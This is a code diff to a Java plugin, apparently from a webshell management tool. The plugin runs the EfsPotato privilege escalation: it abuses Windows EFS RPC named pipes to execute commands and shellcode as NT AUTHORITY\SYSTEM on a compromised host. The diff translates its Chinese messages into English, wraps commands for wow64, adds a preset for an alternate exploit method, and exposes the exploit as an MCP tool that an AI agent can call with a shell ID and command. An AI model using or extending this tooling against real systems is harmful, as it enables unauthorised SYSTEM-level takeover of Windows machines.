@@ -49,7 +49,7 @@ public class EfsPotato extends ShellcodeLoader {
     private final RTextArea resultTextArea;
     private final JLabel commandTextLabel = new JLabel("Command:");
     private final JLabel pipeComboBoxLabel = new JLabel("Pipe:");
-    private final JLabel exploitMethodComboBoxLabel = new JLabel("漏洞利用方法:");
+    private final JLabel exploitMethodComboBoxLabel = new JLabel("Method:");
     private final JComboBox pipeComboBox;
     private final JComboBox exploitMethodComboBox;
     private boolean loadState;
@@ -112,12 +112,12 @@ public class EfsPotato extends ShellcodeLoader {
 
     private void runButtonClick(ActionEvent actionEvent) {
         if (!this.load()) {
-            GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
+            GOptionPane.showMessageDialog(this.panel, "Load fail", "???", 2);
         } else {
             ReqParameter parameter = new ReqParameter();
             parameter.add("pipe", this.pipeComboBox.getSelectedItem().toString());
             parameter.add("exploitMethod", this.exploitMethodComboBox.getSelectedItem().toString());
-            parameter.add("cmd", this.commandTextField.getText());
+            parameter.add("cmd", shells.plugins.generic.PayloadArch.wow64NativeCmd(this.payload, this.commandTextField.getText()));
             byte[] result = this.payload.evalFunc("EfsPotato.EfsPotato", "run", parameter);
             this.resultTextArea.setText(this.encoding.Decoding(result));
             if (!this.superModel && result != null && this.encoding.Decoding(result).toUpperCase().indexOf("NT AUTHORITY\\SYSTEM") != -1) {
@@ -131,40 +131,49 @@ public class EfsPotato extends ShellcodeLoader {
                     loader.childLoder = this;
                 }
 
-                GOptionPane.showMessageDialog(this.panel, "您是SYSTEM! 已升级到高级模式", "提示", 1);
+                javax.swing.JOptionPane.showMessageDialog(
+                        this.panel,
+                        "\u63d0\u6743\u6210\u529f (NT AUTHORITY\\SYSTEM)",
+                        "EfsPotato",
+                        javax.swing.JOptionPane.INFORMATION_MESSAGE);
             }
 
         }
     }
 
+    public void useBypassMethod() {
+        this.pipeComboBox.setSelectedItem("lsarpc");
+        this.exploitMethodComboBox.setSelectedItem("EfsRpcEncryptFileSrv");
+    }
+
     public byte[] runShellcode(ReqParameter reqParameter, String command, byte[] shellcode, int readWait) {
-        reqParameter.add("cmd", command);
+        reqParameter.add("cmd", shells.plugins.generic.PayloadArch.wow64NativeCmd(this.payload, command));
         reqParameter.add("pipe", this.pipeComboBox.getSelectedItem().toString());
         reqParameter.add("exploitMethod", this.exploitMethodComboBox.getSelectedItem().toString());
         reqParameter.add("readWait", Integer.toString(readWait));
         return super.runShellcode(reqParameter, command, shellcode, readWait);
     }
 
-    @McpTool(name = "run", desc = "EfsPotato 提权执行命令 (默认管道 lsarpc, 方法 EfsRpcOpenFileRaw)", params = {
+    @McpTool(name = "run", desc = "EfsPotato run command (default pipe lsarpc)", params = {
             @McpParam(name = "shellId", required = true, desc = "Shell ID"),
-            @McpParam(name = "cmd", required = true, desc = "要执行的命令, 如: cmd /c whoami"),
+            @McpParam(name = "cmd", required = true, desc = "command, e.g. cmd /c whoami"),
             @McpParam(name = "pipe", defaultValue = "lsarpc", desc = "lsarpc/efsrpc/samr/lsass/netlogon"),
             @McpParam(name = "exploitMethod", defaultValue = "EfsRpcOpenFileRaw", desc = "EfsRpcOpenFileRaw/EfsRpcEncryptFileSrv") })
     public String mcpRun(Map<String, Object> args) {
         String cmd = String.valueOf(args.get("cmd"));
         String pipe = String.valueOf(args.getOrDefault("pipe", "lsarpc"));
         String method = String.valueOf(args.getOrDefault("exploitMethod", "EfsRpcOpenFileRaw"));
-        if (cmd == null || cmd.trim().isEmpty()) return "缺少参数: cmd";
-        if (!this.load()) return "插件加载失败 (EfsPotato.dll include 失败)";
+        if (cmd == null || cmd.trim().isEmpty()) return "missing cmd";
+        if (!this.load()) return "plugin load failed (EfsPotato.dll include failed)";
         try {
             ReqParameter parameter = new ReqParameter();
             parameter.add("pipe", pipe);
             parameter.add("exploitMethod", method);
-            parameter.add("cmd", cmd);
+            parameter.add("cmd", shells.plugins.generic.PayloadArch.wow64NativeCmd(this.payload, cmd));
             byte[] result = this.payload.evalFunc("EfsPotato.EfsPotato", "run", parameter);
             return this.encoding.Decoding(result);
         } catch (Exception e) {
-            return "执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
+            return "failed: " + (e.getMessage() != null ? e.getMessage() : e.toString());
         }
     }
 
